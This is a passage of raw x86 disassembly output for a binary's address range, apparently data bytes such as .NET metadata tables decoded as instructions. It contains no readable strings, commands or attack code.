  405947:	00 44 05 18          	add    %al,0x18(%ebp,%eax,1)
  40594b:	01 26                	add    %esp,(%esi)
  40594d:	00 cc                	add    %cl,%ah
  40594f:	45                   	inc    %ebp
  405950:	00 00                	add    %al,(%eax)
  405952:	00 00                	add    %al,(%eax)
  405954:	06                   	push   %es
  405955:	18 19                	sbb    %bl,(%ecx)
  405957:	01 13                	add    %edx,(%ebx)
  405959:	00 29                	add    %ch,(%ecx)
  40595b:	00 d4                	add    %dl,%ah
  40595d:	45                   	inc    %ebp
  40595e:	00 00                	add    %al,(%eax)
  405960:	00 00                	add    %al,(%eax)
  405962:	16                   	push   %ss
  405963:	00 55 05             	add    %dl,0x5(%ebp)
  405966:	bc 00 29 00 60       	mov    $0x60002900,%esp
  40596b:	46                   	inc    %esi
  40596c:	00 00                	add    %al,(%eax)
  40596e:	00 00                	add    %al,(%eax)
  405970:	11 18                	adc    %ebx,(%eax)
  405972:	54                   	push   %esp
  405973:	01 17                	add    %edx,(%edi)
  405975:	00 2a                	add    %ch,(%edx)
  405977:	00 00                	add    %al,(%eax)
  405979:	00 00                	add    %al,(%eax)
  40597b:	00 80 00 16 20 6e    	add    %al,0x6e201600(%eax)
  405981:	05 20 01 2a 00       	add    $0x2a0120,%eax
  405986:	e4 46                	in     $0x46,%al
  405988:	00 00                	add    %al,(%eax)
  40598a:	00 00                	add    %al,(%eax)
  40598c:	16                   	push   %ss
  40598d:	00 8f 05 25 01 2b    	add    %cl,0x2b012505(%edi)
  405993:	00 04 47             	add    %al,(%edi,%eax,2)
  405996:	00 00                	add    %al,(%eax)
  405998:	00 00                	add    %al,(%eax)
  40599a:	16                   	push   %ss
  40599b:	00 c1                	add    %al,%cl
  40599d:	05 63 01 2c 00       	add    $0x2c0163,%eax
  4059a2:	00 00                	add    %al,(%eax)
  4059a4:	00 00                	add    %al,(%eax)
  4059a6:	80 00 16             	addb   $0x16,(%eax)
  4059a9:	20 d8                	and    %bl,%al
  4059ab:	05 68 01 2d 00       	add    $0x2d0168,%eax
  4059b0:	58                   	pop    %eax
  4059b1:	47                   	inc    %edi
  4059b2:	00 00                	add    %al,(%eax)
  4059b4:	00 00                	add    %al,(%eax)
  4059b6:	16                   	push   %ss
  4059b7:	00 04 06             	add    %al,(%esi,%eax,1)
  4059ba:	73 01                	jae    0x4059bd
  4059bc:	2e 00 d4             	cs add %dl,%ah
  4059bf:	47                   	inc    %edi
  4059c0:	00 00                	add    %al,(%eax)
  4059c2:	00 00                	add    %al,(%eax)
  4059c4:	16                   	push   %ss
  4059c5:	00 42 06             	add    %al,0x6(%edx)
  4059c8:	c1 00 2e             	roll   $0x2e,(%eax)
  4059cb:	00 00                	add    %al,(%eax)
  4059cd:	00 00                	add    %al,(%eax)
  4059cf:	00 80 00 16 20 55    	add    %al,0x55201600(%eax)
  4059d5:	06                   	push   %es
  4059d6:	7b 01                	jnp    0x4059d9
  4059d8:	2e 00 00             	add    %al,%cs:(%eax)
  4059db:	00 00                	add    %al,(%eax)
  4059dd:	00 80 00 16 20 83    	add    %al,-0x7cdfea00(%eax)
  4059e3:	06                   	push   %es
  4059e4:	7f 01                	jg     0x4059e7
  4059e6:	2e 00 00             	add    %al,%cs:(%eax)
  4059e9:	00 00                	add    %al,(%eax)
  4059eb:	00 80 00 16 20 a1    	add    %al,-0x5edfea00(%eax)
  4059f1:	06                   	push   %es
  4059f2:	87 01                	xchg   %eax,(%ecx)
  4059f4:	31 00                	xor    %eax,(%eax)
  4059f6:	30 48 00             	xor    %cl,0x0(%eax)
  4059f9:	00 00                	add    %al,(%eax)
  4059fb:	00 16                	add    %dl,(%esi)
  4059fd:	00 c1                	add    %al,%cl
  4059ff:	06                   	push   %es
  405a00:	17                   	pop    %ss
  405a01:	00 32                	add    %dh,(%edx)
  405a03:	00 68 48             	add    %ch,0x48(%eax)
  405a06:	00 00                	add    %al,(%eax)
  405a08:	00 00                	add    %al,(%eax)
  405a0a:	16                   	push   %ss
  405a0b:	00 ce                	add    %cl,%dh
  405a0d:	06                   	push   %es
  405a0e:	c5 00                	lds    (%eax),%eax
  405a10:	32 00                	xor    (%eax),%al
  405a12:	c8 48 00 00          	enter  $0x48,$0x0
  405a16:	00 00                	add    %al,(%eax)
  405a18:	16                   	push   %ss
  405a19:	00 e3                	add    %ah,%bl
  405a1b:	06                   	push   %es
  405a1c:	8e 01                	mov    (%ecx),%es
  405a1e:	32 00                	xor    (%eax),%al
  405a20:	e4 48                	in     $0x48,%al
  405a22:	00 00                	add    %al,(%eax)
  405a24:	00 00                	add    %al,(%eax)
  405a26:	16                   	push   %ss
  405a27:	00 e8                	add    %ch,%al
  405a29:	06                   	push   %es
  405a2a:	94                   	xchg   %eax,%esp
  405a2b:	01 33                	add    %esi,(%ebx)
  405a2d:	00 00                	add    %al,(%eax)
  405a2f:	49                   	dec    %ecx
  405a30:	00 00                	add    %al,(%eax)
  405a32:	00 00                	add    %al,(%eax)
  405a34:	16                   	push   %ss
  405a35:	00 eb                	add    %ch,%bl
  405a37:	06                   	push   %es
  405a38:	c5 00                	lds    (%eax),%eax
  405a3a:	34 00                	xor    $0x0,%al
  405a3c:	90                   	nop
  405a3d:	49                   	dec    %ecx
  405a3e:	00 00                	add    %al,(%eax)
  405a40:	00 00                	add    %al,(%eax)
  405a42:	16                   	push   %ss
  405a43:	00 ee                	add    %ch,%dh
  405a45:	06                   	push   %es
  405a46:	9a 01 34 00 04 4a 00 	lcall  $0x4a,$0x4003401
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 16                	add    %dl,(%esi)
  405a51:	00 01                	add    %al,(%ecx)
  405a53:	07                   	pop    %es
  405a54:	9f                   	lahf
  405a55:	01 35 00 6c 4a 00    	add    %esi,0x4a6c00
  405a5b:	00 00                	add    %al,(%eax)
  405a5d:	00 16                	add    %dl,(%esi)
  405a5f:	00 10                	add    %dl,(%eax)
  405a61:	07                   	pop    %es
  405a62:	8e 01                	mov    (%ecx),%es
  405a64:	37                   	aaa
  405a65:	00 dc                	add    %bl,%ah
  405a67:	4a                   	dec    %edx
  405a68:	00 00                	add    %al,(%eax)
  405a6a:	00 00                	add    %al,(%eax)
  405a6c:	16                   	push   %ss
  405a6d:	00 19                	add    %bl,(%ecx)
  405a6f:	07                   	pop    %es
  405a70:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405a71:	01 38                	add    %edi,(%eax)
  405a73:	00 7c 4c 00          	add    %bh,0x0(%esp,%ecx,2)
  405a77:	00 00                	add    %al,(%eax)
  405a79:	00 16                	add    %dl,(%esi)
  405a7b:	00 24 07             	add    %ah,(%edi,%eax,1)
  405a7e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405a7f:	01 39                	add    %edi,(%ecx)
  405a81:	00 0c 4e             	add    %cl,(%esi,%ecx,2)
  405a84:	00 00                	add    %al,(%eax)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	16                   	push   %ss
  405a89:	00 2d 07 a6 01 3a    	add    %ch,0x3a01a607
  405a8f:	00 80 4e 00 00 00    	add    %al,0x4e(%eax)
  405a95:	00 16                	add    %dl,(%esi)
  405a97:	00 3b                	add    %bh,(%ebx)
  405a99:	07                   	pop    %es
  405a9a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405a9b:	01 3b                	add    %edi,(%ebx)
  405a9d:	00 f4                	add    %dh,%ah
  405a9f:	4e                   	dec    %esi
  405aa0:	00 00                	add    %al,(%eax)
  405aa2:	00 00                	add    %al,(%eax)
  405aa4:	16                   	push   %ss
  405aa5:	00 53 07             	add    %dl,0x7(%ebx)
  405aa8:	07                   	pop    %es
  405aa9:	01 3c 00             	add    %edi,(%eax,%eax,1)
  405aac:	18 4f 00             	sbb    %cl,0x0(%edi)
  405aaf:	00 00                	add    %al,(%eax)
  405ab1:	00 16                	add    %dl,(%esi)
  405ab3:	00 5f 07             	add    %bl,0x7(%edi)
  405ab6:	17                   	pop    %ss
  405ab7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405aba:	00 00                	add    %al,(%eax)
  405abc:	00 00                	add    %al,(%eax)
  405abe:	03 00                	add    (%eax),%eax
  405ac0:	06                   	push   %es
  405ac1:	18 19                	sbb    %bl,(%ecx)
  405ac3:	01 28                	add    %ebp,(%eax)
  405ac5:	03 3c 00             	add    (%eax,%eax,1),%edi
  405ac8:	00 00                	add    %al,(%eax)
  405aca:	00 00                	add    %al,(%eax)
  405acc:	03 00                	add    (%eax),%eax
  405ace:	46                   	inc    %esi
  405acf:	03 4c 0a 2e          	add    0x2e(%edx,%ecx,1),%ecx
  405ad3:	03 3e                	add    (%esi),%edi
  405ad5:	00 00                	add    %al,(%eax)
  405ad7:	00 00                	add    %al,(%eax)
  405ad9:	00 03                	add    %al,(%ebx)
  405adb:	00 46 03             	add    %al,0x3(%esi)
  405ade:	7c 0a                	jl     0x405aea
  405ae0:	37                   	aaa
  405ae1:	03 40 00             	add    0x0(%eax),%eax
  405ae4:	00 00                	add    %al,(%eax)
  405ae6:	00 00                	add    %al,(%eax)
  405ae8:	03 00                	add    (%eax),%eax
  405aea:	46                   	inc    %esi
  405aeb:	03 9a 0a 13 00 41    	add    0x4100130a(%edx),%ebx
  405af1:	00 44 44 00          	add    %al,0x0(%esp,%eax,2)
  405af5:	00 00                	add    %al,(%eax)
  405af7:	00 06                	add    %al,(%esi)
  405af9:	18 19                	sbb    %bl,(%ecx)
  405afb:	01 13                	add    %edx,(%ebx)
  405afd:	00 41 00             	add    %al,0x0(%ecx)
  405b00:	7c 43                	jl     0x405b45
  405b02:	00 00                	add    %al,(%eax)
  405b04:	00 00                	add    %al,(%eax)
  405b06:	06                   	push   %es
  405b07:	08 10                	or     %dl,(%eax)
  405b09:	10 13                	adc    %dl,(%ebx)
  405b0b:	00 41 00             	add    %al,0x0(%ecx)
  405b0e:	00 00                	add    %al,(%eax)
  405b10:	01 00                	add    %eax,(%eax)
  405b12:	15 02 00 00 01       	adc    $0x1000002,%eax
  405b17:	00 4e 02             	add    %cl,0x2(%esi)
  405b1a:	00 00                	add    %al,(%eax)
  405b1c:	01 00                	add    %eax,(%eax)
  405b1e:	4e                   	dec    %esi
  405b1f:	02 00                	add    (%eax),%al
  405b21:	00 01                	add    %al,(%ecx)
  405b23:	00 96 03 00 00 01    	add    %dl,0x1000003(%esi)
  405b29:	00 df                	add    %bl,%bh
  405b2b:	03 00                	add    (%eax),%eax
  405b2d:	00 01                	add    %al,(%ecx)
  405b2f:	00 ec                	add    %ch,%ah
  405b31:	03 00                	add    (%eax),%eax
  405b33:	00 01                	add    %al,(%ecx)
  405b35:	00 f3                	add    %dh,%bl
  405b37:	03 00                	add    (%eax),%eax
  405b39:	00 01                	add    %al,(%ecx)
  405b3b:	00 df                	add    %bl,%bh
  405b3d:	03 00                	add    (%eax),%eax
  405b3f:	00 01                	add    %al,(%ecx)
  405b41:	00 13                	add    %dl,(%ebx)
  405b43:	04 00                	add    $0x0,%al
  405b45:	00 01                	add    %al,(%ecx)
  405b47:	00 86 0b 00 00 01    	add    %al,0x100000b(%esi)
  405b4d:	00 86 0b 00 00 01    	add    %al,0x100000b(%esi)
  405b53:	00 ec                	add    %ch,%ah
  405b55:	03 00                	add    (%eax),%eax
  405b57:	00 01                	add    %al,(%ecx)
  405b59:	00 30                	add    %dh,(%eax)
  405b5b:	04 00                	add    $0x0,%al
  405b5d:	00 01                	add    %al,(%ecx)
  405b5f:	00 f3                	add    %dh,%bl
  405b61:	03 00                	add    (%eax),%eax
  405b63:	00 01                	add    %al,(%ecx)
  405b65:	00 f3                	add    %dh,%bl
  405b67:	03 00                	add    (%eax),%eax
  405b69:	00 01                	add    %al,(%ecx)
  405b6b:	00 60 04             	add    %ah,0x4(%eax)
  405b6e:	00 00                	add    %al,(%eax)
  405b70:	01 00                	add    %eax,(%eax)
  405b72:	71 04                	jno    0x405b78
  405b74:	00 00                	add    %al,(%eax)
  405b76:	01 00                	add    %eax,(%eax)
  405b78:	7e 04                	jle    0x405b7e
  405b7a:	00 00                	add    %al,(%eax)
  405b7c:	02 00                	add    (%eax),%al
  405b7e:	82 04 00 00          	addb   $0x0,(%eax,%eax,1)
  405b82:	01 00                	add    %eax,(%eax)
  405b84:	a1 04 00 00 02       	mov    0x2000004,%eax
  405b89:	00 b0 04 00 00 03    	add    %dh,0x3000004(%eax)
  405b8f:	00 b8 04 00 00 04    	add    %bh,0x4000004(%eax)
  405b95:	00 ba 04 00 00 05    	add    %bh,0x5000004(%edx)
  405b9b:	00 bc 04 00 00 06 00 	add    %bh,0x60000(%esp,%eax,1)
  405ba2:	c3                   	ret
  405ba3:	04 00                	add    $0x0,%al
  405ba5:	00 07                	add    %al,(%edi)
  405ba7:	00 cb                	add    %cl,%bl
  405ba9:	04 00                	add    $0x0,%al
  405bab:	00 08                	add    %cl,(%eax)
  405bad:	00 d6                	add    %dl,%dh
  405baf:	04 00                	add    $0x0,%al
  405bb1:	00 01                	add    %al,(%ecx)
  405bb3:	00 fa                	add    %bh,%dl
  405bb5:	04 00                	add    $0x0,%al
  405bb7:	20 02                	and    %al,(%edx)
  405bb9:	00 02                	add    %al,(%edx)
  405bbb:	05 00 00 03 00       	add    $0x30000,%eax
  405bc0:	0b 05 00 20 04 00    	or     0x42000,%eax
  405bc6:	12 05 00 00 05 00    	adc    0x50000,%al
  405bcc:	1a 05 00 00 01 00    	sbb    0x10000,%al
  405bd2:	2c 05                	sub    $0x5,%al
  405bd4:	00 00                	add    %al,(%eax)
  405bd6:	02 00                	add    (%eax),%al
  405bd8:	71 04                	jno    0x405bde
  405bda:	00 00                	add    %al,(%eax)
  405bdc:	01 00                	add    %eax,(%eax)
  405bde:	3d 05 00 00 01       	cmp    $0x1000005,%eax
  405be3:	00 86 0b 00 00 01    	add    %al,0x100000b(%esi)
  405be9:	00 86 0b 00 00 01    	add    %al,0x100000b(%esi)
  405bef:	00 48 05             	add    %cl,0x5(%eax)
  405bf2:	00 00                	add    %al,(%eax)
  405bf4:	02 00                	add    (%eax),%al
  405bf6:	51                   	push   %ecx
  405bf7:	05 00 00 03 00       	add    $0x30000,%eax
  405bfc:	30 04 00             	xor    %al,(%eax,%eax,1)
  405bff:	00 01                	add    %al,(%ecx)
  405c01:	00 5d 05             	add    %bl,0x5(%ebp)
  405c04:	00 00                	add    %al,(%eax)
  405c06:	01 00                	add    %eax,(%eax)
  405c08:	85 05 00 00 01 00    	test   %eax,0x10000
  405c0e:	a1 05 00 00 01       	mov    0x1000005,%eax
  405c13:	00 d1                	add    %dl,%cl
  405c15:	05 00 00 01 00       	add    $0x10000,%eax
  405c1a:	e9 05 00 00 01       	jmp    0x1405c24
  405c1f:	00 91 06 00 00 02    	add    %dl,0x2000006(%ecx)
  405c25:	00 96 06 00 00 03    	add    %dl,0x3000006(%esi)
  405c2b:	00 9b 06 00 00 01    	add    %bl,0x1000006(%ebx)
  405c31:	00 b9 06 00 00 01    	add    %bh,0x1000006(%ecx)
  405c37:	00 e6                	add    %ah,%dh
  405c39:	06                   	push   %es
  405c3a:	00 00                	add    %al,(%eax)
  405c3c:	01 00                	add    %eax,(%eax)
  405c3e:	ec                   	in     (%dx),%al
  405c3f:	03 00                	add    (%eax),%eax
  405c41:	00 01                	add    %al,(%ecx)
  405c43:	00 f7                	add    %dh,%bh
  405c45:	06                   	push   %es
  405c46:	00 00                	add    %al,(%eax)
  405c48:	01 00                	add    %eax,(%eax)
  405c4a:	a1 05 00 00 02       	mov    0x2000005,%eax
  405c4f:	00 0a                	add    %cl,(%edx)
  405c51:	07                   	pop    %es
  405c52:	00 00                	add    %al,(%eax)
  405c54:	01 00                	add    %eax,(%eax)
  405c56:	0a 07                	or     (%edi),%al
  405c58:	00 00                	add    %al,(%eax)
  405c5a:	01 00                	add    %eax,(%eax)
  405c5c:	5d                   	pop    %ebp
  405c5d:	05 00 00 01 00       	add    $0x10000,%eax
  405c62:	5d                   	pop    %ebp
  405c63:	05 00 00 01 00       	add    $0x10000,%eax
  405c68:	5d                   	pop    %ebp
  405c69:	05 00 00 01 00       	add    $0x10000,%eax
  405c6e:	5d                   	pop    %ebp
  405c6f:	05 00 00 01 00       	add    $0x10000,%eax
  405c74:	24 0a                	and    $0xa,%al
  405c76:	00 00                	add    %al,(%eax)
  405c78:	02 00                	add    (%eax),%al
  405c7a:	31 0a                	xor    %ecx,(%edx)
  405c7c:	00 00                	add    %al,(%eax)
  405c7e:	01 00                	add    %eax,(%eax)
  405c80:	58                   	pop    %eax
  405c81:	0a 00                	or     (%eax),%al
  405c83:	00 02                	add    %al,(%edx)
  405c85:	00 69 0a             	add    %ch,0xa(%ecx)
  405c88:	00 00                	add    %al,(%eax)
  405c8a:	01 00                	add    %eax,(%eax)
  405c8c:	86 0a                	xchg   %cl,(%edx)
  405c8e:	09 00                	or     %eax,(%eax)
  405c90:	19 01                	sbb    %eax,(%ecx)
  405c92:	13 00                	adc    (%eax),%eax
  405c94:	91                   	xchg   %eax,%ecx
  405c95:	00 19                	add    %bl,(%ecx)
  405c97:	01 c7                	add    %eax,%edi
  405c99:	01 a1 00 19 01 d6    	add    %esp,-0x29fee700(%ecx)
  405c9f:	01 11                	add    %edx,(%ecx)
  405ca1:	00 19                	add    %bl,(%ecx)
  405ca3:	01 13                	add    %edx,(%ebx)
  405ca5:	00 a9 00 19 01 13    	add    %ch,0x13011900(%ecx)
  405cab:	00 24 00             	add    %ah,(%eax,%eax,1)
  405cae:	19 01                	sbb    %eax,(%ecx)
  405cb0:	13 00                	adc    (%eax),%eax
  405cb2:	2c 00                	sub    $0x0,%al
  405cb4:	19 01                	sbb    %eax,(%ecx)
  405cb6:	13 00                	adc    (%eax),%eax
  405cb8:	34 00                	xor    $0x0,%al
  405cba:	19 01                	sbb    %eax,(%ecx)
  405cbc:	13 00                	adc    (%eax),%eax
  405cbe:	3c 00                	cmp    $0x0,%al
  405cc0:	19 01                	sbb    %eax,(%ecx)
  405cc2:	13 00                	adc    (%eax),%eax
  405cc4:	24 00                	and    $0x0,%al
  405cc6:	6b 02 8b             	imul   $0xffffff8b,(%edx),%eax
  405cc9:	00 2c 00             	add    %ch,(%eax,%eax,1)
  405ccc:	6b 02 8b             	imul   $0xffffff8b,(%edx),%eax
  405ccf:	00 34 00             	add    %dh,(%eax,%eax,1)
  405cd2:	6b 02 8b             	imul   $0xffffff8b,(%edx),%eax
  405cd5:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405cd8:	6b 02 8b             	imul   $0xffffff8b,(%edx),%eax
  405cdb:	00 b1 00 19 01 13    	add    %dh,0x13011900(%ecx)
  405ce1:	00 b9 00 19 01 13    	add    %bh,0x13011900(%ecx)
  405ce7:	00 c1                	add    %al,%cl
  405ce9:	00 19                	add    %bl,(%ecx)
  405ceb:	01 25 02 c9 00 1a    	add    %esp,0x1a00c902
  405cf1:	09 70 02             	or     %esi,0x2(%eax)
  405cf4:	19 00                	sbb    %eax,(%eax)
  405cf6:	0e                   	push   %cs
  405cf7:	02 63 00             	add    0x0(%ebx),%ah
  405cfa:	19 00                	sbb    %eax,(%eax)
  405cfc:	17                   	pop    %ss
  405cfd:	02 68 00             	add    0x0(%eax),%ch
  405d00:	29 00                	sub    %eax,(%eax)
  405d02:	3b 09                	cmp    (%ecx),%ecx
  405d04:	7d 02                	jge    0x405d08
  405d06:	19 00                	sbb    %eax,(%eax)
  405d08:	30 02                	xor    %al,(%edx)
  405d0a:	71 00                	jno    0x405d0c
  405d0c:	d9 00                	flds   (%eax)
  405d0e:	57                   	push   %edi
  405d0f:	09 8d 02 19 00 19    	or     %ecx,0x19001902(%ebp)
  405d15:	01 13                	add    %edx,(%ebx)
  405d17:	00 e1                	add    %ah,%cl
  405d19:	00 19                	add    %bl,(%ecx)
  405d1b:	01 9d 02 44 00 7b    	add    %ebx,0x7b004402(%ebp)
  405d21:	02 90 00 e9 00 19    	add    0x1900e900(%eax),%dl
  405d27:	01 18                	add    %ebx,(%eax)
  405d29:	03 f1                	add    %ecx,%esi
  405d2b:	00 19                	add    %bl,(%ecx)
  405d2d:	01 13                	add    %edx,(%ebx)
  405d2f:	00 f9                	add    %bh,%cl
  405d31:	00 19                	add    %bl,(%ecx)
  405d33:	01 13                	add    %edx,(%ebx)
  405d35:	00 01                	add    %al,(%ecx)
  405d37:	01 f1                	add    %esi,%ecx
  405d39:	09 23                	or     %esp,(%ebx)
  405d3b:	03 19                	add    (%ecx),%ebx
  405d3d:	01 19                	add    %ebx,(%ecx)
  405d3f:	01 25 02 21 01 19    	add    %esp,0x19012102
  405d45:	01 13                	add    %edx,(%ebx)
  405d47:	00 59 00             	add    %bl,0x0(%ecx)
  405d4a:	b3 02                	mov    $0x2,%bl
  405d4c:	6f                   	outsl  %ds:(%esi),(%dx)
  405d4d:	03 01                	add    (%ecx),%eax
  405d4f:	01 30                	add    %esi,(%eax)
  405d51:	02 74 03 31          	add    0x31(%ebx,%eax,1),%dh
  405d55:	01 05 0b 79 03 39    	add    %eax,0x3903790b
  405d5b:	01 21                	add    %esp,(%ecx)
  405d5d:	0b 6f 03             	or     0x3(%edi),%ebp
  405d60:	31 01                	xor    %eax,(%ecx)
  405d62:	26 0b 17             	or     %es:(%edi),%edx
  405d65:	00 41 01             	add    %al,0x1(%ecx)
  405d68:	19 01                	sbb    %eax,(%ecx)
  405d6a:	28 03                	sub    %al,(%ebx)
  405d6c:	59                   	pop    %ecx
  405d6d:	00 19                	add    %bl,(%ecx)
  405d6f:	01 80 03 59 00 44    	add    %eax,0x44005903(%eax)
  405d75:	0b 13                	or     (%ebx),%edx
  405d77:	00 59 00             	add    %bl,0x0(%ecx)
  405d7a:	4a                   	dec    %edx
  405d7b:	0b 13                	or     (%ebx),%edx
  405d7d:	00 61 00             	add    %ah,0x0(%ecx)
  405d80:	19 01                	sbb    %eax,(%ecx)
  405d82:	13 00                	adc    (%eax),%eax
  405d84:	61                   	popa
  405d85:	00 4f 0b             	add    %cl,0xb(%edi)
  405d88:	91                   	xchg   %eax,%ecx
  405d89:	03 49 01             	add    0x1(%ecx),%ecx
  405d8c:	5f                   	pop    %edi
  405d8d:	0b 97 03 51 01 19    	or     0x19015103(%edi),%edx
  405d93:	01 13                	add    %edx,(%ebx)
  405d95:	00 49 00             	add    %cl,0x0(%ecx)
  405d98:	19 01                	sbb    %eax,(%ecx)
  405d9a:	18 03                	sbb    %al,(%ebx)
  405d9c:	69 01 b6 0b 9b 03    	imul   $0x39b0bb6,(%ecx),%eax
  405da2:	61                   	popa
  405da3:	00 4f 0b             	add    %cl,0xb(%edi)
  405da6:	a2 03 71 01 c0       	mov    %al,0xc0017103
  405dab:	0b a7 03 59 01 30    	or     0x30015903(%edi),%esp
  405db1:	02 71 00             	add    0x0(%ecx),%dh
  405db4:	31 00                	xor    %eax,(%eax)
  405db6:	19 01                	sbb    %eax,(%ecx)
  405db8:	c6 03 39             	movb   $0x39,(%ebx)
  405dbb:	00 19                	add    %bl,(%ecx)
  405dbd:	01 13                	add    %edx,(%ebx)
  405dbf:	00 31                	add    %dh,(%ecx)
  405dc1:	00 0a                	add    %cl,(%edx)
  405dc3:	0c d3                	or     $0xd3,%al
  405dc5:	03 31                	add    (%ecx),%esi
  405dc7:	00 20                	add    %ah,(%eax)
  405dc9:	0c d3                	or     $0xd3,%al
  405dcb:	03 31                	add    (%ecx),%esi
  405dcd:	00 33                	add    %dh,(%ebx)
  405dcf:	0c d8                	or     $0xd8,%al
  405dd1:	03 11                	add    (%ecx),%edx
  405dd3:	01 19                	add    %ebx,(%ecx)
  405dd5:	01 28                	add    %ebp,(%eax)
  405dd7:	03 31                	add    (%ecx),%esi
  405dd9:	00 d2                	add    %dl,%dl
  405ddb:	03 de                	add    %esi,%ebx
  405ddd:	03 79 01             	add    0x1(%ecx),%edi
  405de0:	19 01                	sbb    %eax,(%ecx)
  405de2:	28 03                	sub    %al,(%ebx)
  405de4:	41                   	inc    %ecx
  405de5:	00 19                	add    %bl,(%ecx)
  405de7:	01 ee                	add    %ebp,%esi
  405de9:	03 a9 01 57 0c 97    	add    -0x68f3a8ff(%ecx),%ebp
  405def:	03 b1 01 19 01 13    	add    0x13011901(%ecx),%esi
  405df5:	00 39                	add    %bh,(%ecx)
  405df7:	01 68 0c             	add    %ebp,0xc(%eax)
  405dfa:	c5 00                	lds    (%eax),%eax
  405dfc:	b1 01                	mov    $0x1,%cl
  405dfe:	75 0c                	jne    0x405e0c
  405e00:	71 00                	jno    0x405e02
  405e02:	69 01 84 0c 02 04    	imul   $0x4020c84,(%ecx),%eax
  405e08:	39 01                	cmp    %eax,(%ecx)
  405e0a:	9c                   	pushf
  405e0b:	0c 08                	or     $0x8,%al
  405e0d:	04 b9                	add    $0xb9,%al
  405e0f:	01 aa 0c 71 00 69    	add    %ebp,0x6900710c(%edx)
  405e15:	01 ba 0c 0e 04 39    	add    %edi,0x39040e0c(%edx)
  405e1b:	01 c1                	add    %eax,%ecx
  405e1d:	0c 07                	or     $0x7,%al
  405e1f:	01 c1                	add    %eax,%ecx
  405e21:	01 30                	add    %esi,(%eax)
  405e23:	02 71 00             	add    0x0(%ecx),%dh
  405e26:	69 01 ba 0c 14 04    	imul   $0x4140cba,(%ecx),%eax
  405e2c:	c9                   	leave
  405e2d:	01 19                	add    %ebx,(%ecx)
  405e2f:	01 25 02 d9 01 05    	add    %esp,0x501d902
  405e35:	0d 24 04 d1 01       	or     $0x1d10424,%eax
  405e3a:	30 02                	xor    %al,(%edx)
  405e3c:	2a 04 e1             	sub    (%ecx,%eiz,8),%al
  405e3f:	01 1c 0d 9a 01 e9 01 	add    %ebx,0x1e9019a(,%ecx,1)
  405e46:	32 0d 3c 04 f1 01    	xor    0x1f1043c,%cl
  405e4c:	6a 0d                	push   $0xd
  405e4e:	4a                   	dec    %edx
  405e4f:	04 f9                	add    $0xf9,%al
  405e51:	01 19                	add    %ebx,(%ecx)
  405e53:	01 50 04             	add    %edx,0x4(%eax)
  405e56:	f9                   	stc
  405e57:	01 99 0d 57 04 39    	add    %ebx,0x3904570d(%ecx)
  405e5d:	01 18                	add    %ebx,(%eax)
  405e5f:	0e                   	push   %cs
  405e60:	c5 00                	lds    (%eax),%eax
  405e62:	69 01 ba 0c 66 04    	imul   $0x4660cba,(%ecx),%eax
  405e68:	09 02                	or     %eax,(%edx)
  405e6a:	19 01                	sbb    %eax,(%ecx)
  405e6c:	d6                   	salc
  405e6d:	01 71 00             	add    %esi,0x0(%ecx)
  405e70:	19 01                	sbb    %eax,(%ecx)
  405e72:	13 00                	adc    (%eax),%eax
  405e74:	09 02                	or     %eax,(%edx)
  405e76:	28 0e                	sub    %cl,(%esi)
  405e78:	6d                   	insl   (%dx),%es:(%edi)
  405e79:	04 19                	add    $0x19,%al
  405e7b:	02 2c 0e             	add    (%esi,%ecx,1),%ch
  405e7e:	73 04                	jae    0x405e84
  405e80:	21 02                	and    %eax,(%edx)
  405e82:	3a 0e                	cmp    (%esi),%cl
  405e84:	79 04                	jns    0x405e8a
  405e86:	11 02                	adc    %eax,(%edx)
  405e88:	46                   	inc    %esi
  405e89:	0e                   	push   %cs
  405e8a:	7f 04                	jg     0x405e90
  405e8c:	71 00                	jno    0x405e8e
  405e8e:	4f                   	dec    %edi
  405e8f:	0e                   	push   %cs
  405e90:	84 04 21             	test   %al,(%ecx,%eiz,1)
  405e93:	02 56 0e             	add    0xe(%esi),%dl
  405e96:	97                   	xchg   %eax,%edi
  405e97:	03 29                	add    (%ecx),%ebp
  405e99:	02 6b 0e             	add    0xe(%ebx),%ch
  405e9c:	13 00                	adc    (%eax),%eax
  405e9e:	71 00                	jno    0x405ea0
  405ea0:	30 02                	xor    %al,(%edx)
  405ea2:	71 00                	jno    0x405ea4
  405ea4:	69 01 73 0e 68 00    	imul   $0x680e73,(%ecx),%eax
  405eaa:	71 00                	jno    0x405eac
  405eac:	73 0e                	jae    0x405ebc
  405eae:	68 00 69 01 7e       	push   $0x7e016900
  405eb3:	0e                   	push   %cs
  405eb4:	8a 04 69             	mov    (%ecx,%ebp,2),%al
  405eb7:	01 a5 0e 99 00 31    	add    %esp,0x3100990e(%ebp)
  405ebd:	02 19                	add    (%ecx),%bl
  405ebf:	01 25 02 09 02 19    	add    %esp,0x19020902
  405ec5:	01 a2 04 e9 01 ab    	add    %esp,-0x54fe16fc(%edx)
  405ecb:	0e                   	push   %cs
  405ecc:	a9 04 39 02 19       	test   $0x19023904,%eax
  405ed1:	01 25 02 39 02 28    	add    %esp,0x28023902
  405ed7:	0e                   	push   %cs
  405ed8:	13 00                	adc    (%eax),%eax
  405eda:	41                   	inc    %ecx
  405edb:	02 cc                	add    %ah,%cl
  405edd:	0e                   	push   %cs
  405ede:	ca 04 b1             	lret   $0xb104
  405ee1:	01 d5                	add    %edx,%ebp
  405ee3:	0e                   	push   %cs
  405ee4:	d0 04 51             	rolb   $1,(%ecx,%edx,2)
  405ee7:	02 ff                	add    %bh,%bh
  405ee9:	0e                   	push   %cs
  405eea:	d4 04                	aam    $0x4
  405eec:	59                   	pop    %ecx
  405eed:	02 08                	add    (%eax),%cl
  405eef:	0f d9 04 61          	psubusw (%ecx,%eiz,2),%mm0
  405ef3:	02 30                	add    (%eax),%dh
  405ef5:	02 71 00             	add    0x0(%ecx),%dh
  405ef8:	69 01 15 0f 8a 04    	imul   $0x48a0f15,(%ecx),%eax
  405efe:	31 00                	xor    %eax,(%eax)
  405f00:	1c 0f                	sbb    $0xf,%al
  405f02:	e8 04 39 00 27       	call   0x2740980b
  405f07:	0f ee 04 01          	pmaxsw (%ecx,%eax,1),%mm0
  405f0b:	01 2f                	add    %ebp,(%edi)
  405f0d:	0f f3 04 69          	psllq  (%ecx,%ebp,2),%mm0
